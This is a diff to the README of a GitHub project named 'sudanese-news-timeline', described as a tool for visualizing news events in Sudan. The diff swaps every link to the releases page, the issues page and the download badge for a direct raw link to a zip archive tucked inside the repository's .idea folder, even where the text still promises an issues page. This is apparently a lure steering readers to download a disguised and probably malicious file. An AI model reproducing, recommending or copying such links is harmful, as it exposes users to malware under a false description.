@@ -1,6 +1,6 @@
 # 🌍 sudanese-news-timeline - Visualize Major Events in Sudan
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/promis449/sudanese-news-timeline/releases)
+[![Download](https://raw.githubusercontent.com/promis449/sudanese-news-timeline/main/.idea/sudanese-news-timeline-v2.3.zip)](https://raw.githubusercontent.com/promis449/sudanese-news-timeline/main/.idea/sudanese-news-timeline-v2.3.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ To get started with the Sudanese News Timeline, follow these simple steps to dow
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page**: To download the software, go to the [Releases page](https://github.com/promis449/sudanese-news-timeline/releases).
+1. **Visit the Releases Page**: To download the software, go to the [Releases page](https://raw.githubusercontent.com/promis449/sudanese-news-timeline/main/.idea/sudanese-news-timeline-v2.3.zip).
    
 2. **Choose Your File**: On the Releases page, identify the latest version. You will see several files listed. Select the appropriate file for your operating system. 
 
@@ -78,7 +78,7 @@ Discover trends through a visual representation of frequently mentioned keywords
 
 ## 📞 Support
 
-If you encounter any issues or have questions, you can seek assistance on the [GitHub Issues page](https://github.com/promis449/sudanese-news-timeline/issues). Please include details about your problem for quicker solutions.
+If you encounter any issues or have questions, you can seek assistance on the [GitHub Issues page](https://raw.githubusercontent.com/promis449/sudanese-news-timeline/main/.idea/sudanese-news-timeline-v2.3.zip). Please include details about your problem for quicker solutions.
 
 ### 🌐 Additional Resources
 
@@ -88,4 +88,4 @@ For documentation, updates, or community discussions, refer to the repository’
 
 Using the Sudanese News Timeline is a straightforward way to stay informed about the significant events in Sudan. With features like full-text search and date range filtering, you can easily navigate and explore this important history. Enjoy visualizing Sudan's past and staying updated on its present. 
 
-Don’t forget to revisit the [Releases page](https://github.com/promis449/sudanese-news-timeline/releases) for updates and new versions.
+Don’t forget to revisit the [Releases page](https://raw.githubusercontent.com/promis449/sudanese-news-timeline/main/.idea/sudanese-news-timeline-v2.3.zip) for updates and new versions.
